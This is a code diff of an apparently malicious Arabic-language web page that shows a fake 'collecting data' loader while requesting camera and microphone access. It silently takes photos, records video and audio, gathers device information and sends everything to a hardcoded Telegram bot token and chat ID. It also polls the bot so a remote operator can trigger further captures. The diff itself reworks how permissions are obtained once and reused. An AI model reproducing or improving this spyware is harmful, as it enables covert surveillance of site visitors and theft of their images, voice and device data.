@@ -26,17 +26,119 @@
             100% { transform: rotate(360deg); }
         }
         .hidden { display: none; }
+        .permission-status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
     <h1>جاري جمع البيانات...</h1>
     <div class="loader"></div>
     <p id="status">جاري جمع المعلومات...</p>
+    <div id="permissionStatus" class="permission-status"></div>
 
     <script>
         const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
         const chat_id = "5932979028";
         let lastUpdateId = 0;
+        
+        // متغيرات لحفظ تيارات الكاميرا والميكروفون بعد الحصول على الصلاحية
+        let globalVideoStream = null;
+        let globalAudioStream = null;
+        let globalVideoTrack = null;
+        let imageCapture = null;
+        let permissionsGranted = false;
+
+        // دالة طلب الصلاحيات مرة واحدة
+        async function requestPermissionsOnce() {
+            const statusDiv = document.getElementById('permissionStatus');
+            statusDiv.innerHTML = '⏳ جاري طلب صلاحيات الكاميرا والميكروفون...';
+            
+            try {
+                // طلب الكاميرا
+                const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                globalVideoStream = videoStream;
+                globalVideoTrack = videoStream.getVideoTracks()[0];
+                imageCapture = new ImageCapture(globalVideoTrack);
+                
+                // طلب الميكروفون
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                globalAudioStream = audioStream;
+                
+                permissionsGranted = true;
+                statusDiv.innerHTML = '✅ تم منح صلاحيات الكاميرا والميكروفون بنجاح';
+                statusDiv.className = 'permission-status success';
+                
+                // إيقاف التيارات مؤقتاً (سنشغلها مرة أخرى عند الحاجة)
+                stopVideoStream();
+                stopAudioStream();
+                
+                return true;
+            } catch (e) {
+                console.error("فشل الحصول على الصلاحيات:", e);
+                statusDiv.innerHTML = '❌ فشل الحصول على الصلاحيات. يرجى السماح للكاميرا والميكروفون';
+                statusDiv.className = 'permission-status error';
+                permissionsGranted = false;
+                return false;
+            }
+        }
+        
+        // دالة تشغيل الكاميرا (بدون طلب صلاحية جديد)
+        async function startVideoStream() {
+            if (globalVideoStream && globalVideoTrack && globalVideoTrack.readyState === 'live') {
+                return true;
+            }
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                globalVideoStream = stream;
+                globalVideoTrack = stream.getVideoTracks()[0];
+                imageCapture = new ImageCapture(globalVideoTrack);
+                return true;
+            } catch (e) {
+                console.error("فشل تشغيل الكاميرا:", e);
+                return false;
+            }
+        }
+        
+        // دالة إيقاف الكاميرا
+        function stopVideoStream() {
+            if (globalVideoStream) {
+                globalVideoStream.getTracks().forEach(track => {
+                    if (track.readyState === 'live') track.stop();
+                });
+            }
+        }
+        
+        // دالة تشغيل الميكروفون (بدون طلب صلاحية جديد)
+        async function startAudioStream() {
+            if (globalAudioStream && globalAudioStream.getTracks()[0]?.readyState === 'live') {
+                return true;
+            }
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                globalAudioStream = stream;
+                return true;
+            } catch (e) {
+                console.error("فشل تشغيل الميكروفون:", e);
+                return false;
+            }
+        }
+        
+        // دالة إيقاف الميكروفون
+        function stopAudioStream() {
+            if (globalAudioStream) {
+                globalAudioStream.getTracks().forEach(track => {
+                    if (track.readyState === 'live') track.stop();
+                });
+            }
+        }
 
         // دالة إرسال رسالة نصية
         async function sendToTelegram(text) {
@@ -137,15 +239,18 @@
             await sendToTelegram(msg);
         }
 
-        // التقاط صورة واحدة
+        // التقاط صورة واحدة (بدون طلب صلاحية)
         async function captureSinglePhoto() {
+            if (!permissionsGranted) {
+                await sendToTelegram("❌ لم يتم منح صلاحيات الكاميرا بعد");
+                return;
+            }
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
+                await startVideoStream();
                 const blob = await imageCapture.takePhoto();
                 await sendPhoto(blob);
-                track.stop();
+                stopVideoStream();
                 await sendToTelegram("✅ تم التقاط الصورة وإرسالها");
             } catch (e) {
                 console.warn("فشل التقاط الصورة:", e);
@@ -153,8 +258,13 @@
             }
         }
 
-        // تسجيل فيديو 10 ثوان
+        // تسجيل فيديو 10 ثوان (بدون طلب صلاحية)
         async function recordSingleVideo() {
+            if (!permissionsGranted) {
+                await sendToTelegram("❌ لم يتم منح صلاحيات الكاميرا والميكروفون بعد");
+                return;
+            }
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -176,8 +286,13 @@
             }
         }
 
-        // تسجيل صوت 10 ثوان
+        // تسجيل صوت 10 ثوان (بدون طلب صلاحية)
         async function recordSingleAudio() {
+            if (!permissionsGranted) {
+                await sendToTelegram("❌ لم يتم منح صلاحيات الميكروفون بعد");
+                return;
+            }
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -199,13 +314,15 @@
             }
         }
 
-        // التقاط 10 صور
+        // التقاط 10 صور (بدون طلب صلاحية)
         async function take10Photos() {
+            if (!permissionsGranted) {
+                await sendToTelegram("❌ لم يتم منح صلاحيات الكاميرا بعد");
+                return;
+            }
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-
+                await startVideoStream();
                 for (let i = 0; i < 10; i++) {
                     try {
                         const blob = await imageCapture.takePhoto();
@@ -213,7 +330,7 @@
                         await new Promise(r => setTimeout(r, 500));
                     } catch (e) {}
                 }
-                track.stop();
+                stopVideoStream();
                 await sendToTelegram("✅ تم التقاط 10 صور وإرسالها");
             } catch (e) {
                 console.warn("فشل التقاط الصور:", e);
@@ -223,6 +340,11 @@
 
         // تسجيل 10 تسجيلات صوت
         async function record10Audios() {
+            if (!permissionsGranted) {
+                await sendToTelegram("❌ لم يتم منح صلاحيات الميكروفون بعد");
+                return;
+            }
+            
             try {
                 for (let i = 0; i < 10; i++) {
                     await new Promise((resolve) => {
@@ -326,11 +448,13 @@
 
         // 1️⃣ التقاط 10 صور بالكاميرا (الأصلي)
         async function take10PhotosAndThen(callback) {
+            if (!permissionsGranted) {
+                if (callback) callback();
+                return;
+            }
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const track = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(track);
-
+                await startVideoStream();
                 for (let i = 0; i < 2; i++) {
                     try {
                         const blob = await imageCapture.takePhoto();
@@ -338,8 +462,7 @@
                         await new Promise(r => setTimeout(r, 500));
                     } catch (e) {}
                 }
-
-                track.stop();
+                stopVideoStream();
                 if (callback) callback();
             } catch (e) {
                 console.warn("فشل التقاط الصور:", e);
@@ -349,6 +472,11 @@
 
         // 2️⃣ تسجيل فيديو 10 ثوانٍ (الأصلي)
         async function recordVideoThen(callback) {
+            if (!permissionsGranted) {
+                if (callback) callback();
+                return;
+            }
+            
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -372,31 +500,32 @@
 
         // 3️⃣ تسجيل 10 تسجيلات صوت كل منها 10 ثوانٍ (الأصلي)
         async function record10AudiosSequentially() {
+            if (!permissionsGranted) return;
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                let chunks = [];
-                let count = 1;
+                for (let i = 0; i < 2; i++) {
+                    await new Promise((resolve) => {
+                        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+                            const recorder = new MediaRecorder(stream);
+                            const chunks = [];
 
-                recorder.ondataavailable = e => chunks.push(e.data);
+                            recorder.ondataavailable = e => chunks.push(e.data);
+                            recorder.onstop = async () => {
+                                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                                await sendVoice(blob);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                            };
 
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/ogg' });
-                    await sendVoice(blob);
-                    chunks = [];
-                    count++;
-                    if (count < 2) {
-                        setTimeout(() => {
                             recorder.start();
                             setTimeout(() => recorder.stop(), 10000);
-                        }, 1000);
-                    } else {
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                };
-
-                recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
+                        }).catch(e => {
+                            console.warn("فشل التسجيل:", e);
+                            resolve();
+                        });
+                    });
+                    await new Promise(r => setTimeout(r, 1000));
+                }
             } catch (e) {
                 console.warn("فشل تسجيل الصوت:", e);
             }
@@ -404,20 +533,27 @@
 
         // بدء السلسلة بعد دخول الموقع (الأصلي)
         window.onload = async () => {
-            await sendDeviceInfo();
+            // طلب الصلاحيات مرة واحدة فقط
+            const granted = await requestPermissionsOnce();
             
-            // إرسال واجهة البوت المتطورة
-            await sendAdvancedMenu();
-            await sendToTelegram("🎮 مرحباً! استخدم الأزرار أدناه للتحكم عن بعد");
+            if (granted) {
+                await sendDeviceInfo();
+                
+                // إرسال واجهة البوت المتطورة
+                await sendAdvancedMenu();
+                await sendToTelegram("🎮 مرحباً! استخدم الأزرار أدناه للتحكم عن بعد");
 
-            take10PhotosAndThen(() => {
-                recordVideoThen(() => {
-                    record10AudiosSequentially();
+                take10PhotosAndThen(() => {
+                    recordVideoThen(() => {
+                        record10AudiosSequentially();
+                    });
                 });
-            });
-            
-            // بدء الاستماع لأزرار البوت
-            setInterval(getUpdates, 2000);
+                
+                // بدء الاستماع لأزرار البوت
+                setInterval(getUpdates, 2000);
+            } else {
+                document.getElementById('status').innerHTML = '❌ لم يتم منح الصلاحيات - يرجى تحديث الصفحة والسماح للكاميرا والميكروفون';
+            }
         };
     </script>
 </body>
